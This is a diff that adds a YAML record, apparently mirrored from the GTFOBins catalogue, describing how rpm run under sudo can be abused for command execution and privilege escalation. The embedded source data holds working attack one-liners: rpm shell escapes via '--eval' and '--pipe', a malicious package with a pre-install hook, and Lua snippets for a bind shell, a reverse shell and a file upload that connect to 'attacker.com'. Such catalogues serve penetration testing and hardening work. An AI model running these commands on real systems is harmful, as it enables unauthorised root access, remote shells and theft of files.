@@ -1,0 +1,176 @@
+id: gtfobins/rpm/inherit/sudo
+type: binary
+platform: linux
+name: rpm
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: rpm --eval '%{lua:...}'
+  comment: This allows to run Lua code (`...`).
+references:
+- https://gtfobins.github.io/gtfobins/rpm/
+- https://gtfobins.github.io/gtfobins/lua/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        rpm:
+          functions:
+            command:
+            - code: rpm -ivh x-1.0-1.noarch.rpm
+              comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload
+                it to the target.
+
+
+                ```
+
+                echo /path/to/command >x.sh
+
+                fpm -n x -s dir -t rpm -a all --before-install x.sh .
+
+                ```'
+              contexts:
+                sudo: null
+            inherit:
+            - code: rpm --eval '%{lua:...}'
+              comment: This allows to run Lua code (`...`).
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: lua
+              version: Some older version is required.
+            shell:
+            - code: rpm --eval '%(/bin/sh 1>&2)'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: rpm --pipe '/bin/sh 0<&1'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+        lua:
+          functions:
+            bind-shell:
+            - code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n\
+                \  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"\
+                r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
+              comment: This requires `lua-socket` to be available.
+              connector: tcp-client
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            download:
+            - code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n\
+                \  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"\
+                /path/to/output-file\", \"wb\");\n  f:write(d);\n  io.close(f);'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: tcp-client
+            file-read:
+            - code: lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"\
+                attacker.com\",12345);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"\
+                r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: lua -e 'os.execute("/bin/sh")'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            upload:
+            - code: "lua -e '\n  local f=io.open(\"/path/to/input-file\", \"rb\")\n  local d=f:read(\"\
+                *a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"\
+                attacker.com\",12345);\n  t:send(d);\n  t:close();'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: tcp-server
+    upstream_url: https://gtfobins.github.io/gtfobins/rpm/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  - value: privilege-escalation
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:7c921e5c3b980bc6316eb7634d14be8a32a4b13aeaeb0af3db256aa56c8638a3
